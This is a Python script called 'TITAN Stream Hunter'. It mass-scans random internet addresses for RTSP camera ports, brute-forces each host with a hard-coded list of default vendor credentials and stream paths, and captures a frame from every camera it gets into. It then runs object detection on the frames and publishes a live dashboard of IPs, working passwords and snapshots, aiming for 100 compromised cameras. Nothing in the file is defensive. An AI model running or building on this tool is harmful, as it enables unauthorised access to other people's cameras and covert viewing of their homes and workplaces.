#!/usr/bin/env python3
"""
TITAN STREAM HUNTER — Find 100 Live Valid RTSP Cameras & Stream Dashboard
Ultra-aggressive: massively parallel port scan → fast RTSP validation → frame grab → live dashboard
"""

import asyncio
import base64
import ipaddress
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE = Path(__file__).resolve().parent
FRAMES = BASE / "stream_frames"
RESULTS = BASE / "results"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS, RTSP_PATHS, CREDENTIALS, YOLO_CLASSES

# ── Globals ───────────────────────────────────────────────
VALID_STREAMS = []
LOCK = threading.Lock()
TARGET = 100
STATS = {
    "ips_scanned": 0, "ports_open": 0, "rtsp_valid": 0,
    "frames_grabbed": 0, "rounds": 0, "status": "initializing",
    "start_time": None, "last_find": None,
}

# ── Top priority paths + creds (most common globally) ────
FAST_PATHS = [
    "/Streaming/Channels/101",
    "/cam/realmonitor?channel=1&subtype=0",
    "/",
    "/stream1",
    "/live",
    "/h264/ch1/main/av_stream",
    "/onvif1",
    "/0",
    "/1",
    "/live.sdp",
    "/h264Preview_01_main",
    "/main",
    "/stream",
    "/11",
    "/media/video1",
    "/s0",
    "/videoMain",
    "/axis-media/media.amp",
    "/live/ch00_0",
    "/video1",
]

FAST_CREDS = [
    ("", ""),                # anonymous
    ("admin", ""),           # hikvision older
    ("admin", "12345"),      # hikvision default
    ("admin", "admin"),      # generic
    ("admin", "123456"),     # dahua
    ("admin", "888888"),     # chinese
    ("admin", "1234"),
    ("root", ""),            # axis
    ("admin", "password"),
    ("admin", "Admin123"),
]

# ══════════════════════════════════════════════════════════
# IP GENERATOR — weighted random from global CIDRs
# ══════════════════════════════════════════════════════════

def ip_generator(cidrs, batch=20000):
    nets = [ipaddress.ip_network(c, strict=False) for c in cidrs if '/' in c]
    weights = [n.num_addresses for n in nets]
    while True:
        ips = set()
        while len(ips) < batch:
            net = random.choices(nets, weights=weights, k=1)[0]
            if net.num_addresses > 2:
                off = random.randint(1, net.num_addresses - 2)
                ip = str(net.network_address + off)
                if not (ip.endswith(".0") or ip.endswith(".255")):
                    ips.add(ip)
        yield list(ips)

# ══════════════════════════════════════════════════════════
# ASYNC PORT SCANNER — 3000 concurrent connections
# ══════════════════════════════════════════════════════════

async def check_port(ip, port, sem, timeout=0.7):
    async with sem:
        try:
            _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
            w.close()
            await w.wait_closed()
            return (ip, port)
        except Exception:
            return None

async def async_port_scan(ips, ports, concurrency=3000):
    sem = asyncio.Semaphore(concurrency)
    tasks = [check_port(ip, p, sem) for ip in ips for p in ports]
    hits = []
    for batch in _chunked(tasks, 5000):
        results = await asyncio.gather(*batch, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                hits.append(r)
    return hits

def _chunked(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

def port_scan(ips, ports):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(async_port_scan(ips, ports))
    finally:
        loop.close()

# ══════════════════════════════════════════════════════════
# RTSP VALIDATOR — single ffprobe per URL, fast timeout
# ══════════════════════════════════════════════════════════

def validate_rtsp(ip, port, timeout=4):
    """Try fast cred+path combos until one works. Return stream info or None."""
    # Build prioritized URL list (anonymous first, then top creds × top paths)
    urls = []
    for user, pwd in FAST_CREDS:
        for path in FAST_PATHS:
            auth = f"{user}:{pwd}@" if user else ""
            urls.append((f"rtsp://{auth}{ip}:{port}{path}", user, pwd, path))

    for rtsp_url, user, pwd, path in urls:
        try:
            proc = subprocess.run(
                ["ffprobe", "-v", "quiet", "-print_format", "json", "-show_streams",
                 "-rtsp_transport", "tcp",
                 "-stimeout", str(timeout * 1_000_000),
                 rtsp_url],
                capture_output=True, text=True, timeout=timeout + 2
            )
            if proc.returncode == 0 and '"codec_type"' in proc.stdout:
                # Valid stream! Parse resolution
                try:
                    info = json.loads(proc.stdout)
                    vs = [s for s in info.get("streams", []) if s.get("codec_type") == "video"]
                    w = vs[0].get("width", "?") if vs else "?"
                    h = vs[0].get("height", "?") if vs else "?"
                    codec = vs[0].get("codec_name", "?") if vs else "?"
                    reso = f"{w}x{h}"
                except Exception:
                    reso, codec = "?", "?"

                return {
                    "ip": ip, "port": port, "rtsp_url": rtsp_url,
                    "user": user, "password": pwd, "path": path,
                    "resolution": reso, "codec": codec,
                    "timestamp": datetime.now().isoformat(),
                }
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            continue
    return None

# ══════════════════════════════════════════════════════════
# FRAME GRABBER — capture one JPEG from validated stream
# ══════════════════════════════════════════════════════════

def grab_frame(stream, timeout=6):
    """Grab a single frame from a validated RTSP stream."""
    safe = stream["ip"].replace(".", "_")
    fpath = str(FRAMES / f"cam_{safe}_{stream['port']}.jpg")
    try:
        subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp",
             "-stimeout", str(timeout * 1_000_000),
             "-i", stream["rtsp_url"],
             "-vframes", "1", "-q:v", "3",
             "-f", "image2", fpath],
            capture_output=True, timeout=timeout + 2
        )
        if os.path.isfile(fpath) and os.path.getsize(fpath) > 2000:
            with open(fpath, "rb") as f:
                stream["frame_b64"] = base64.b64encode(f.read()).decode()
            stream["frame_file"] = fpath
            stream["frame_size"] = os.path.getsize(fpath)
            return True
    except Exception:
        pass
    return False

# ══════════════════════════════════════════════════════════
# YOLO DETECTION (optional enrichment)
# ══════════════════════════════════════════════════════════

_yolo = None
_yolo_lock = threading.Lock()

def get_yolo():
    global _yolo
    if _yolo is None:
        with _yolo_lock:
            if _yolo is None:
                from ultralytics import YOLO
                mp = str(BASE.parent / "yolov8n.pt")
                _yolo = YOLO(mp if os.path.exists(mp) else "yolov8n.pt")
    return _yolo

def detect_objects(frame_path, conf=0.25):
    try:
        m = get_yolo()
        results = m(frame_path, conf=conf, verbose=False)
        objects = []
        for r in results:
            for box in r.boxes:
                cls = int(box.cls[0])
                label = YOLO_CLASSES.get(cls, f"cls{cls}")
                c = float(box.conf[0])
                objects.append({"label": label, "conf": round(c, 2)})
        return objects
    except Exception:
        return []

# ══════════════════════════════════════════════════════════
# DASHBOARD GENERATOR
# ══════════════════════════════════════════════════════════

DASH_PATH = BASE / "live_streams.html"

def build_dashboard():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    elapsed = ""
    if STATS["start_time"]:
        dt = time.time() - STATS["start_time"]
        m, s = divmod(int(dt), 60)
        h, m = divmod(m, 60)
        elapsed = f"{h}h {m}m {s}s"

    cards = ""
    for i, cam in enumerate(VALID_STREAMS):
        b64 = cam.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" class="thumb">' if b64 else '<div class="no-frame">Grabbing frame...</div>'
        objs = cam.get("objects", [])
        obj_str = ", ".join(o["label"] for o in objs[:8]) if objs else "—"
        cards += f'''
        <div class="card">
            <div class="cam-num">#{i+1}</div>
            <div class="cam-ip">{cam["ip"]}:{cam["port"]}</div>
            {img}
            <div class="cam-info">
                <div><b>Resolution:</b> {cam.get("resolution","?")}</div>
                <div><b>Codec:</b> {cam.get("codec","?")}</div>
                <div><b>Path:</b> {cam.get("path","?")}</div>
                <div><b>Creds:</b> {cam.get("user","anon")}:{cam.get("password","") or "(blank)"}</div>
                <div><b>Objects:</b> {obj_str}</div>
                <div class="rtsp-url">{cam.get("rtsp_url","")}</div>
            </div>
        </div>'''

    pct = min(100, int(len(VALID_STREAMS) / max(TARGET, 1) * 100))
    html = f'''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TITAN Stream Hunter — LIVE</title>
<meta http-equiv="refresh" content="10">
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ background:#0a0a1a; color:#e0e0e0; font-family:'Courier New',monospace; padding:15px; }}
h1 {{ color:#ff3333; font-size:22px; margin-bottom:10px; }}
.stats {{ background:#111122; border:1px solid #333; border-radius:8px; padding:12px 18px; margin-bottom:15px; display:flex; flex-wrap:wrap; gap:15px; align-items:center; }}
.stat {{ font-size:13px; }} .stat b {{ color:#0ff; }}
.stat-big {{ font-size:18px; color:#0f0; font-weight:bold; }}
.progress {{ background:#222; height:20px; border-radius:10px; overflow:hidden; flex-basis:100%; }}
.progress-bar {{ background:linear-gradient(90deg,#0f0,#0ff); height:100%; transition:width 0.5s; border-radius:10px; }}
.grid {{ display:flex; flex-wrap:wrap; gap:10px; }}
.card {{ background:#12122a; border:1px solid #2a2a4a; border-radius:8px; width:280px; padding:10px; position:relative; transition:border-color 0.3s; }}
.card:hover {{ border-color:#0ff; }}
.cam-num {{ position:absolute; top:6px; right:8px; background:#0f0; color:#000; font-weight:bold; font-size:11px; padding:2px 6px; border-radius:4px; }}
.cam-ip {{ color:#ff0; font-size:12px; font-weight:bold; margin-bottom:6px; }}
.thumb {{ width:100%; border-radius:5px; margin-bottom:6px; }}
.no-frame {{ height:150px; background:#1a1a2e; border-radius:5px; display:flex; align-items:center; justify-content:center; color:#555; font-size:12px; margin-bottom:6px; }}
.cam-info {{ font-size:11px; line-height:1.6; color:#aaa; }}
.cam-info b {{ color:#ccc; }}
.rtsp-url {{ color:#0ff; font-size:9px; word-break:break-all; margin-top:4px; padding:3px; background:#0a0a15; border-radius:3px; }}
</style></head>
<body>
<h1>⚡ TITAN STREAM HUNTER — LIVE DASHBOARD</h1>
<div class="stats">
    <div class="stat-big">🎯 {len(VALID_STREAMS)} / {TARGET}</div>
    <div class="stat"><b>IPs Scanned:</b> {STATS["ips_scanned"]:,}</div>
    <div class="stat"><b>Open Ports:</b> {STATS["ports_open"]:,}</div>
    <div class="stat"><b>Valid RTSP:</b> {STATS["rtsp_valid"]:,}</div>
    <div class="stat"><b>Frames:</b> {STATS["frames_grabbed"]:,}</div>
    <div class="stat"><b>Rounds:</b> {STATS["rounds"]}</div>
    <div class="stat"><b>Elapsed:</b> {elapsed}</div>
    <div class="stat"><b>Status:</b> <span style="color:#0f0;">{STATS["status"]}</span></div>
    <div class="stat"><b>Updated:</b> {ts}</div>
    <div class="progress"><div class="progress-bar" style="width:{pct}%"></div></div>
</div>
<div class="grid">{cards}</div>
</body></html>'''
    DASH_PATH.write_text(html)

# ══════════════════════════════════════════════════════════
# HTTP SERVER
# ══════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            data = {"stats": STATS, "valid": len(VALID_STREAMS), "target": TARGET,
                    "streams": [{"ip": s["ip"], "port": s["port"], "rtsp_url": s["rtsp_url"],
                                 "resolution": s.get("resolution"), "codec": s.get("codec")} for s in VALID_STREAMS]}
            self.wfile.write(json.dumps(data, default=str).encode())
        elif self.path == "/api/streams":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps([{k: s.get(k) for k in
                ["ip","port","rtsp_url","user","password","path","resolution","codec","timestamp","objects"]}
                for s in VALID_STREAMS], default=str).encode())
        else:
            if DASH_PATH.exists():
                data = DASH_PATH.read_bytes()
            else:
                data = b"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:40px;'><h1>TITAN STREAM HUNTER</h1><p>Starting up... refresh in a moment.</p></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(data)

    def log_message(self, *args):
        pass

def start_server(port):
    srv = HTTPServer(('0.0.0.0', port), Handler)
    print(f"[HTTP] Dashboard live → http://localhost:{port}")
    srv.serve_forever()

# ══════════════════════════════════════════════════════════
# MAIN HUNT LOOP
# ══════════════════════════════════════════════════════════

def hunt(cidrs, workers=120, batch_size=20000, http_port=7701):
    STATS["start_time"] = time.time()
    STATS["status"] = "loading YOLO"
    build_dashboard()

    # Start HTTP server
    threading.Thread(target=start_server, args=(http_port,), daemon=True).start()

    # Pre-load YOLO
    print("[INIT] Loading YOLOv8...")
    get_yolo()
    print("[INIT] YOLO ready")

    STATS["status"] = "HUNTING"
    gen = ip_generator(cidrs, batch=batch_size)
    seen_ips = set()

    while len(VALID_STREAMS) < TARGET:
        STATS["rounds"] += 1
        rnd = STATS["rounds"]
        batch = next(gen)
        batch = [ip for ip in batch if ip not in seen_ips]
        seen_ips.update(batch)
        STATS["ips_scanned"] += len(batch)

        print(f"\n[R{rnd}] Scanning {len(batch):,} IPs | found={len(VALID_STREAMS)}/{TARGET} | total_scanned={STATS['ips_scanned']:,}")

        # Phase 1: Port scan
        hits = port_scan(batch, [554, 8554, 37777])
        STATS["ports_open"] += len(hits)
        if not hits:
            print(f"  → 0 open ports")
            continue
        print(f"  → {len(hits)} open RTSP ports. Validating streams...")

        # Phase 2: Parallel RTSP validation
        found_this_round = 0
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(validate_rtsp, ip, port): (ip, port) for ip, port in hits}
            for fut in as_completed(futs):
                if len(VALID_STREAMS) >= TARGET:
                    break
                try:
                    stream = fut.result()
                    if stream is None:
                        continue

                    STATS["rtsp_valid"] += 1

                    # Phase 3: Grab frame
                    if grab_frame(stream):
                        STATS["frames_grabbed"] += 1

                    # Phase 4: YOLO detect
                    if stream.get("frame_file"):
                        objs = detect_objects(stream["frame_file"])
                        stream["objects"] = objs

                    # Store it
                    with LOCK:
                        VALID_STREAMS.append(stream)
                    found_this_round += 1
                    STATS["last_find"] = datetime.now().isoformat()

                    obj_str = ", ".join(o["label"] for o in stream.get("objects", [])[:5])
                    print(f"  ✅ #{len(VALID_STREAMS):>3}  {stream['ip']:>15}:{stream['port']:<5}  "
                          f"{stream.get('resolution','?'):>10}  {stream.get('codec','?'):>6}  [{obj_str}]  "
                          f"path={stream['path']}")

                    # Update dashboard every few finds
                    if len(VALID_STREAMS) % 3 == 0 or len(VALID_STREAMS) >= TARGET:
                        build_dashboard()
                        save_results()

                except Exception:
                    pass

        print(f"  → {found_this_round} valid streams this round | total={len(VALID_STREAMS)}/{TARGET}")
        build_dashboard()

    STATS["status"] = "COMPLETE ✓"
    build_dashboard()
    save_results()
    elapsed = time.time() - STATS["start_time"]
    m, s = divmod(int(elapsed), 60)
    print(f"\n{'='*60}")
    print(f"  COMPLETE — {len(VALID_STREAMS)} live RTSP streams found in {m}m {s}s")
    print(f"  Dashboard: http://localhost:7701")
    print(f"  Results: {RESULTS / 'live_streams.json'}")
    print(f"{'='*60}")

def save_results():
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": STATS,
        "streams": [{k: s.get(k) for k in
            ["ip","port","rtsp_url","user","password","path","resolution","codec","timestamp","objects"]}
            for s in VALID_STREAMS],
    }
    with open(RESULTS / "live_streams.json", "w") as f:
        json.dump(out, f, indent=2, default=str)

# ══════════════════════════════════════════════════════════
# ENTRY
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="TITAN Stream Hunter — find 100 live RTSP cameras")
    p.add_argument("--target", type=int, default=100, help="Number of valid streams to find")
    p.add_argument("--port", type=int, default=7701, help="Dashboard HTTP port")
    p.add_argument("--workers", type=int, default=120, help="Parallel RTSP validation workers")
    p.add_argument("--batch", type=int, default=20000, help="IPs per scan round")
    args = p.parse_args()

    TARGET = args.target
    all_cidrs = [c for country in GLOBAL_CIDRS.values() for c in country]
    print(f"[INIT] {len(all_cidrs)} CIDRs across {len(GLOBAL_CIDRS)} countries")
    print(f"[INIT] Target: {TARGET} valid live RTSP streams")
    print(f"[INIT] {len(FAST_CREDS)} credential sets × {len(FAST_PATHS)} paths = {len(FAST_CREDS)*len(FAST_PATHS)} combos per host")

    try:
        hunt(all_cidrs, workers=args.workers, batch_size=args.batch, http_port=args.port)
    except KeyboardInterrupt:
        print(f"\nStopped. {len(VALID_STREAMS)} streams found.")
    finally:
        save_results()
        build_dashboard()
        print("Results saved.")
